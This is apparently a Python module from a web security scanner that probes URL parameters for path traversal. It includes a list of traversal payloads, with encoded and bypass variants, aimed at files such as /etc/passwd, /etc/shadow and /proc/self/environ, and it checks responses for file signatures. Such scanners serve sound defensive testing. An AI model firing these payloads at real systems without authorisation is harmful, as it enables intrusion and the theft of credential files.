import urllib.parse
from typing import Dict, List, Optional
from app.utils.http_client import fetch_url


def scan_path_traversal(scan_context: dict) -> dict:
    if not scan_context.get("url"):
        return {"error": "missing_url"}

    url = scan_context["url"]
    evidence = []
    is_vulnerable = False
    highest_confidence = 0.0

    path_traversal_payloads = [
        ("../../../../etc/passwd", "linux", "passwd file"),
        ("../../../../windows/win.ini", "windows", "win.ini file"),
        ("../../../../etc/hosts", "linux", "hosts file"),
        ("../../../../../../etc/passwd", "linux", "passwd file (deeper)"),
        ("..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "windows", "hosts file (Windows)"),
        ("..%2F..%2F..%2F..%2Fetc%2Fpasswd", "linux", "passwd (URL encoded)"),
        ("..%252F..%252F..%252F..%252Fetc%252Fpasswd", "linux", "passwd (double URL)"),
        ("....//....//....//etc/passwd", "linux", "passwd (bypass)"),
        ("/etc/passwd", "linux", "absolute path"),
        ("C:\\Windows\\System32\\drivers\\etc\\hosts", "windows", "Windows absolute"),
        ("../../../../etc/shadow", "linux", "shadow file"),
        ("../../../../proc/self/environ", "linux", "process environ"),
        ("../../../../proc/version", "linux", "kernel version"),
        ("..\\/..\\/..\\/..\\/etc/passwd", "mixed", "mixed slash"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "linux", "Unicode bypass"),
        ("..;/..;/..;/etc/passwd", "linux", "semicolon bypass"),
    ]

    try:
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)

        common_file_params = [
            'file', 'path', 'doc', 'document', 'page', 'view', 'download',
            'img', 'image', 'photo', 'source', 'src', 'template', 'style',
            'css', 'js', 'lang', 'language', 'content', 'data', 'include',
            'inc', 'folder', 'dir', 'filename', 'name', 'id', 'file_id',
            'page', 'cat', 'category', 'report', 'log', 'config', 'conf'
        ]

        test_params = list(params.keys())
        if not test_params:
            test_params = common_file_params[:5]

        for param_name in test_params:
            for payload, os_type, description in path_traversal_payloads[:8]:
                test_params_dict = params.copy()
                test_params_dict[param_name] = [payload]

                new_query = urllib.parse.urlencode(test_params_dict, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))

                response = fetch_url(test_url)
                if response:
                    vuln_data = analyze_path_response(
                        response.text, payload, param_name, test_url, os_type
                    )
                    if vuln_data and vuln_data.get('confidence', 0) > highest_confidence:
                        highest_confidence = vuln_data['confidence']
                        evidence.append(vuln_data)
                        if highest_confidence >= 0.8:
                            is_vulnerable = True

    except Exception as e:
        return {
            "vulnerability_type": "path_traversal",
            "is_vulnerable": False,
            "severity": "info",
            "confidence": 0.0,
            "evidence": [{"type": "error", "value": f"Scanner error: {str(e)}"}],
            "recommendation": "An error occurred during path traversal scanning."
        }

    severity = determine_severity(highest_confidence)

    return {
        "vulnerability_type": "path_traversal",
        "is_vulnerable": is_vulnerable,
        "severity": severity,
        "confidence": highest_confidence,
        "evidence": evidence,
        "recommendation": get_path_traversal_recommendation(is_vulnerable, highest_confidence)
    }


def analyze_path_response(response_text: str, payload: str, param_name: str, test_url: str, os_type: str) -> Optional[Dict]:
    linux_indicators = [
        "root:x:", "/bin/bash", "/bin/sh", "nobody:x:",
        "daemon:x:", "adm:x:", "www-data:x:", "mysql:x:"
    ]
    windows_indicators = [
        "[fonts]", "[extensions]", "[mci extensions]",
        "C:\\Windows", "Microsoft Windows"
    ]
    error_indicators = [
        "no such file", "not found", "permission denied",
        "access denied", "cannot open", "invalid path",
        "directory", "parent", "traversal"
    ]

    response_lower = response_text.lower()

    if os_type == "linux":
        for indicator in linux_indicators:
            if indicator in response_text:
                return {
                    "type": "file_read",
                    "parameter": param_name,
                    "payload": payload,
                    "test_url": test_url,
                    "file_type": "linux",
                    "evidence": f"Successfully read {indicator} from system",
                    "confidence": 0.95
                }
    elif os_type == "windows":
        for indicator in windows_indicators:
            if indicator in response_text:
                return {
                    "type": "file_read",
                    "parameter": param_name,
                    "payload": payload,
                    "test_url": test_url,
                    "file_type": "windows",
                    "evidence": f"Successfully read Windows system file",
                    "confidence": 0.95
                }

    for error in error_indicators:
        if error in response_lower:
            return {
                "type": "error_leak",
                "parameter": param_name,
                "payload": payload,
                "test_url": test_url,
                "evidence": f"Error message suggests path traversal possible: {error}",
                "confidence": 0.4
            }

    return None


def determine_severity(confidence: float) -> str:
    if confidence >= 0.9:
        return "critical"
    elif confidence >= 0.7:
        return "high"
    elif confidence >= 0.5:
        return "medium"
    else:
        return "low"


def get_path_traversal_recommendation(is_vulnerable: bool, confidence: float) -> str:
    if not is_vulnerable:
        return "No path traversal vulnerabilities detected. Continue following secure file handling practices."

    if confidence >= 0.9:
        return ("CRITICAL: Path Traversal vulnerability confirmed. "
                "The application allows reading arbitrary files from the filesystem. "
                "Immediate action required: "
                "1. Implement strict input validation with allowlists. "
                "2. Use built-in path resolution functions (realpath, path.normalize). "
                "3. Ensure the resolved path is within the allowed directory. "
                "4. Disable directory listing and restrict file access permissions.")
    else:
        return ("Potential path traversal detected. "
                "Review file input handling, implement strict validation, "
                "and use allowlists for file paths.")
